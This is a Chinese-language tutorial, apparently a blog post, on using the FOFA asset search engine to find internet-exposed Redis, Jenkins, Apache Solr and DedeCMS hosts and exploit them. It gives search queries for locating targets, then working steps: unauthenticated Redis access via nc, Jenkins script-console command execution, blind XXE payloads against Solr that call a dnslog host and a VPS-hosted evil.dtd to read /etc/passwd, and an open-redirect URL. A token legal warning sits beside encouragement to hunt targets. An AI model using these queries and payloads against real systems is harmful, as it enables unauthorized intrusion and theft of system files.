FOFA是一款非常强大的搜索引擎，关于对于fofa的描述是：FOFA（网络空间资产检索系统）是世界上数据覆盖更完整的IT设备搜索引擎，拥有全球联网IT设备更全的DNA信息。探索全球互联网的资产信息，进行资产及漏洞影响范围分析、应用分布统计、应用流行度态势感知等。

​相对于shodan来说fofa的优点就是更加本土化，拥有更多的域名数据，建立了全球最大的资产规则集，而且现在已经更新了识别蜜罐的功能。​

fofa的功能这么强大，那我们要怎么利用好提供的功能来挖洞呢？​

fofa官方提供了一些基本语法：

搜索条件| 搜索内容  
---|---  
title="beijing"| 从标题搜索北京  
header="elastic"| 从http头中搜索“elastic”  
body="网络空间测绘"| 从html正文中搜索“网络空间测绘”  
domain="qq.com"| 搜索根域名带有qq.com的网站。  
icon_hash="-247388890"| 搜索使用此icon的资产。  
host=".gov.cn"| 从url中搜索”.gov.cn”  
is_honeypot=true| 查询蜜罐资产  
ip="220.181.111.1/24"| 查询IP为“220.181.111.1”的C网段资产  
...| ...  
  
而真正高效的用法就是灵活使用逻辑运算符，fofa可以使用高级搜索：括号 和 && || !=等符号进行指纹的组合​。

比如我们想搜索开放3389端口并且位于中国的IP​，对应的语法就是port="3389" && country=CN

下面就展示一些利用fofa来刷洞的过程。

​不过在这之前一定要注意，遵守法律法规，不要作出破坏性的行为，不要做未授权的测试。

不然...嘿嘿嘿，有个地方包吃包住还送白金手镯。

![upload_8d6dbbb46a09b0f23b5f2bc70edf690a.png](https://image.3001.net/images/20210401/1617291326_6065e83ec72fc3db06b78.png!small)

下面的例子，就是利用fofa来刷洞的例子，少年发挥你的想象力吧。

1、Redis未授权fofa语法搜索：

    
    
    port="6379"

![upload_2c5e7206aa0f21613a069bc6fd75df07.png](https://image.3001.net/images/20210401/1617291385_6065e8793c8a5cbcc7ada.png!small)直接nc
连 6379端口

输入命令info返回了redis基本信息

![upload_63ce44fe8ffc7f34586f3bf40b358661.png](https://image.3001.net/images/20210401/1617291415_6065e89709d5d79676d0b.png!small)

2、Jenkins 未授权

fofa语法搜索：

    
    
    port="8080" && app="JENKINS" && title=="Dashboard [Jenkins]"

![upload_5b0baa42a73f1b01ec165c563fe5ebcb.png](https://image.3001.net/images/20210401/1617291449_6065e8b9c9f74d1725e98.png!small)在默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令。

所以jenkins未授权的危害非常大。

执行一下命令：![upload_cc099885707899713db31cfda2334c4e.png](https://image.3001.net/images/20210401/1617291474_6065e8d2bb7bb6281285e.png!small)

3、Apache solr XML 实体注入漏洞

Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene
实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现

fofa语法搜索：

    
    
    app="Solr" && port="8983"

![upload_96015ae2fda62d1737f464d3b7455f6b.png](https://image.3001.net/images/20210401/1617291494_6065e8e6a7f8381270774.png!small)找到了目标ip进入主界面

可以看到版本小于7.0，所以可能存在xxe![upload_f1746fedf3e7a7127b62a70141c14898.png](https://image.3001.net/images/20210401/1617291521_6065e901a92a6ca22c765.png!small)

进入搜索框，切换成搜索xxe![upload_38949aecb4dc4185ca9510305eb39be8.png](https://image.3001.net/images/20210401/1617291562_6065e92aa23a06870d12d.png!small)

BP抓包![upload_b2226fbae3e9fb617d05870b80df9363.png](https://image.3001.net/images/20210401/1617291586_6065e942793ff9aea26f2.png!small)构造payload尝试外带，外带地址是dnslog：qmurld.dnslog.cnpayload:

    
    
    <?xml version="1.0" encoding="UTF-8"?>  
    <!DOCTYPE root [  
    <!ENTITY % remote SYSTEM "http://qmurld.dnslog.cn/">  
    %remote;]>  
    <root/>&wt=xml&defType=xmlparser

将payload进行url编码

    
    
    %3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C%21DOCTYPE%20root%20%5B%0A%3C%21ENTITY%20%25%20remote%20SYSTEM%20%22http%3A//qmurld.dnslog.cn/%22%3E%0A%25remote%3B%5D%3E%0A%3Croot/%3E&wt=xml&defType=xmlparser

![upload_1977db200f9093cd79ae2a562cca37a8.png](https://image.3001.net/images/20210401/1617291617_6065e9611b95350c046bc.png!small)发现外带成功，所以存在xxe漏洞

因为是Blind xxe，所以在需要在vps服务器上构造恶意的dtd

放在服务器上的evil.dtd

    
    
    <!ENTITY % file SYSTEM "file:///etc/passwd">  
    <!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">

BP请求的内容

    
    
    <?xml+version="1.0"+?><!DOCTYPE+root[<!ENTITY+%+ext+SYSTEM+"http://vps的ip地址:端口/evil.dtd">%ext;%ent;]><r>&ampdata</r>

请求的内容也需要进行url编码

    
    
    %3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2f  ip:port  %2fevil.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E

发现已经成功读取到/etc/passwd

![upload_d0b25d789afe32862745ce7b86b76fc3.png](https://image.3001.net/images/20210401/1617291634_6065e972c44cc95d51e59.png!small)

4、dedecms url跳转漏洞

先在fofa语法搜索

    
    
    body="/plus/download.php"

![upload_4a21dc5990ee8a61e4a34e75d1171fd9.png](https://image.3001.net/images/20210401/1617291689_6065e9a97422c48d5834f.png!small)

![upload_0db29caddd962812d9f6b65a9a761c1d.png](https://image.3001.net/images/20210401/1617291719_6065e9c759d09be7f471b.png!small)在后面加入链接/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20%3D跳转到百度，

百度url要base64编码

成功跳转![upload_7b3177a2bdaf9d3f345ea435b7aeee58.png](https://image.3001.net/images/20210401/1617291742_6065e9de779796b6ffd93.png!small)

更多的姿势还需要多多发挥想象力，去组合，去找到对应漏洞的特征。

